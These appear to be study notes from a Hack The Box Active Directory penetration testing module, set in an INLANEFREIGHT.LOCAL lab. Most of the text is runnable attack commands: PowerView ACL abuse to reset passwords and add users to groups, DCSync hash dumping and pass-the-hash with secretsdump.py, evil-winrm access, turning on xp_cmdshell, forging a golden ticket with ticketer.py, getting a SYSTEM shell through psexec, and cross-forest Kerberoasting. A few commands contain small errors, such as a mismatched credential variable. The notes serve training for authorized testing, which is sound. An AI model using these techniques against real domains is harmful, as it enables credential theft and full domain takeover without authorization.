![BloodHound graph showing WLEY@INLANEFREIGHT.LOCAL's connections to various groups and users, including CONTRACTORS, FILE SHARE, and DOMAIN USERS, with relationships like MemberOf and ForceChangePassword.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/wley_path.png)

Finally, we can use the pre-built queries in BloodHound to confirm that the `adunn` user has DCSync rights.

#### **Viewing Pre-Build queries through BloodHound**

![BloodHound graph showing ADUNN@INLANEFREIGHT.LOCAL's connections to various groups and users, including DOMAIN ADMINS and ENTERPRISE DOMAIN CONTROLLERS, with relationships like MemberOf and GetChangesAll.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/adunn_dcsync.png)

## **Abusing ACLs**

lets go with a demo

1. Use the `wley` user to change the password for the `damundsen` user
2. Authenticate as the `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user

#### **Creating a PSCredential Object**

```powershell
        powershell
PS C:\htb> $SecPassword= ConvertTo-SecureString 'transporter@4' -AsPlainText -ForcePS
 C:\htb> $Cred= New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Next, we must create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user `damundsen`.

#### **Creating a SecureString Object**

```powershell
        powershell
PS C:\htb> $damundsenPassword= ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText-Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

```

```powershell
# Adding damundsen to the Help Desk Level 1 Group

PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

```

**Confirming damundsen was Added to the Group**

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

```

**Creating a Fake SPN**

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

```

# **Cleanup**

In terms of cleanup, there are a few things we need to do:

1. Remove the fake SPN we created on the `adunn` user.
2. Remove the `damundsen` user from the `Help Desk Level 1` group
3. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user

This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.

First, let's remove the fake SPN from the `adunn` account.

#### **Removing the Fake SPN from adunn's Account**

```powershell
        powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

```

Next, we'll remove the user from the group using the `Remove-DomainGroupMember` function.

#### **Removing damundsen from the Help Desk Level 1 Group**

```powershell
        powershell
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

```

We can confirm the user was indeed removed:

#### **Confirming damundsen was Removed from the Group**

```powershell
        powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose

```

Even though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report. Our client will want to be apprised of any changes within the environment, and recording everything we do during an assessment in writing helps our client and us should questions arise.

## DCsync attack

### **What is DCSync and How Does it Work?**

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

**Using Get-ObjectAcl to Check adunn's Replication Rights**

```powershell
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

If we had certain rights over the user (such as [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks

**Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**

```powershell
Fau5t@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# we can also use hashes to log in
secretsdump.py -just-dc INLANEFREIGHT/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf
```

We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

- Number and % of passwords cracked
- top 10 passwords
- Password length metrics
- Password re-use
- reflect only active user accounts in the domain.

# **Privileged Access**

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:

- Launch further attacks
- We may be able to escalate privileges and obtain credentials for a higher privileged user
- We may be able to pillage the host for sensitive data or credentials

Using PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host. Let's check out the `Remote Desktop Users` group on the `MS01` host in our target domain.

#### **Enumerating the Remote Desktop Users Group**

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

```

#### **Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**

![Graph showing DOMAIN USERS@INLANEFREIGHT.LOCAL with local admin and execution rights, connected to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL via CanRDP.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/bh_RDP_domain_users.png)

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

#### **Checking Remote Access Rights using BloodHound**

![Node info for WLEY@INLANEFREIGHT.LOCAL showing execution rights, including Group Delegated RDP Privileges set to 1.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/execution_rights.png)

We could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`

To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with  Remote Management Users type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```
        cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

#### **Using the Cypher Query in BloodHound**

![BloodHound graph showing connection from FOREND@INLANEFREIGHT.LOCAL to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL via CanPSRemote.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/canpsremote_bh_cypherq.png)

We could also add this as a custom query to our BloodHound installation, so it's always available to us.

#### **Adding the Cypher Query as a Custom Query in BloodHound**

![Interface for creating a custom query to find WinRM users with dangerous rights.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/user_defined_query.png)

We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.

#### **Connecting to a Target with Evil-WinRM and Valid Credentials**

```bash
Fau5t@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

From here, we could dig around to plan our next move.

---

# **SQL Server Admin**

More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying

BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:

```
        cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Here we see one user, `damundsen` has `SQLAdmin` rights over the host `ACADEMY-EA-DB01`.

#### **Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound**

![Graph showing SQLAdmin connection from ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL to DAMUNDSEN@INLANEFREIGHT.LOCAL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/sqladmins_bh.png)

We can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.

First, let's hunt for SQL server instances.

#### **Enumerating MSSQL Instances with PowerUpSQL**

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain
```

We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.

#### **Running mssqlclient.py Against the Target**

```bash
Fau5t@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
```

Once connected, we could type `help` to see what commands are available to us.

#### **Choosing enable_xp_cmdshell**

```sql
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

```

Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal. These methods are covered in the `SeImpersonate and SeAssignPrimaryToken` of the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module. Try them out on this target if you would like to practice further!

#### **Enumerating our Rights on the System using xp_cmdshell**

```
xp_cmdshell whoami
```

## Bleeding edge vulnerabilities (2023)

#### **NoPac (SamAccountName Spoofing)**

A great example of an emerging threat is the [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.

| 42278 | 42287 |
| --- | --- |
| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |

**PrintNightmare**

**PetitPotam (MS-EFSRPC)**

## Misconfigs

![image.png](/assets/img/writeups/active-directory-ad_image_65.png)

Retrieving the AS-REP Using Kerbrute

```sql
Fau5t@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

## domain trusts

```sql
PS C:\tools> Import-Module ActiveDirectory
PS C:\tools> Get-ADTrust -Filter *
```

### **Attacking Domain Trusts - Child -> Parent Trusts - from Linux**

Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.

**Performing DCSync with secretsdump.py**

```sql
Fau5t@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

Next, we can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format `DOMAIN_SID-RID`. For example, from the output below, we can see that the SID of the `lab_adm` user would be `S-1-5-21-2806153819-209893948-922872689-1001`.

#### **Performing SID Brute Forcing using lookupsid.py**

```sql
Fau5t@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

```

#### looking for domain sid

```sql
Fau5t@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

**Grabbing the Domain SID & Attaching to Enterprise Admin's RID**

```sql
Fau5t@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

```

Next, we can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).

```sql
Fau5t@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

```

**Setting the KRB5CCNAME Environment Variable**

```sql
Fau5t@htb[/htb]$ export KRB5CCNAME=hacker.ccache

```

**Getting a SYSTEM shell using Impacket's psexec.py**

```sql
Fau5t@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

```

Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

- Obtains the SID for the Enterprise Admins group of the parent domain
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain

Finally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.

#### **Performing the Attack with raiseChild.py**

```sql
Fau5t@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

```

Though tools such as `raiseChild.py` can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should **`always`** be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.

`We don't want to tell the client that something broke because we used an "autopwn" script!`

## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux**

### **Cross-Forest Kerberoasting**

#### **Using GetUserSPNs.py**

```sql
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Rerunning the command with the `-request` flag added gives us the TGS ticket. We could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.
